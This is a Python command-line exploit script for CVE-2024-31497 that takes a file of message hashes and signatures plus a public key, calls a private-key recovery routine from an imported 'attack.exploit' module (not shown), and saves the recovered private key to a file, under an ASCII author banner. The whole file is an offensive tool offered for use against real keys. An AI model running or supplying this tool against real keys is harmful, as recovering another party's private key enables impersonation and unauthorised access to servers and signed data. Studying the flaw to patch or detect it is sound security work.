import argparse
from attack.exploit import recover_pk, export_key, read_pubkey


def banner():
    print("""
     ██████ ██    ██ ███████       ██████   ██████  ██████  ██   ██       ██████   ██ ██   ██  █████  ███████ 
    ██      ██    ██ ██                 ██ ██  ████      ██ ██   ██            ██ ███ ██   ██ ██   ██      ██ 
    ██      ██    ██ █████   █████  █████  ██ ██ ██  █████  ███████ █████  █████   ██ ███████  ██████     ██  
    ██       ██  ██  ██            ██      ████  ██ ██           ██            ██  ██      ██      ██    ██   
     ██████   ████   ███████       ███████  ██████  ███████      ██       ██████   ██      ██  █████     ██   
                                                                                                          
    Author: @𝐻𝓊𝑔𝑜𝐵𝑜𝓃𝒹 
                
    """)


def split_values(path):
    values = []
    with open(path,"r") as f:
        for line in f:
            hash, sss = line.split()
            values.append((hash,sss))
    return values


def main(signatures, pubkey, output):
    k = 512  # Nonce bit lenght
    values = split_values(signatures)
    pubkey_hex = read_pubkey(pubkey)
    lines = [(k,hash,sss,pubkey_hex) for hash,sss in values]
    print("Starting private key recovery...")
    pk = recover_pk(lines)
    if pk:

        export_key(pk,output)
        print("\033[92mPrivate key recovered successfully!\033[00m")
        print("Saved in {}".format(output))

    else:

        print("\033[91m Failed to recover private key\033[00m")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-31497")
    parser.add_argument("--signatures","-s", help="Signatures files with hex encoded values like this: <Message Hash> <r|s>", required=True)
    parser.add_argument("--pubkey","-pk", help="Hex Encoded Public Key or DER,PEM,OpenSSH format", required=True)
    parser.add_argument("--output","-o", type=str, help="Output Private Key file name", default="private_key")
    args = parser.parse_args()  
    banner()
    main(args.signatures,args.pubkey,args.output)
    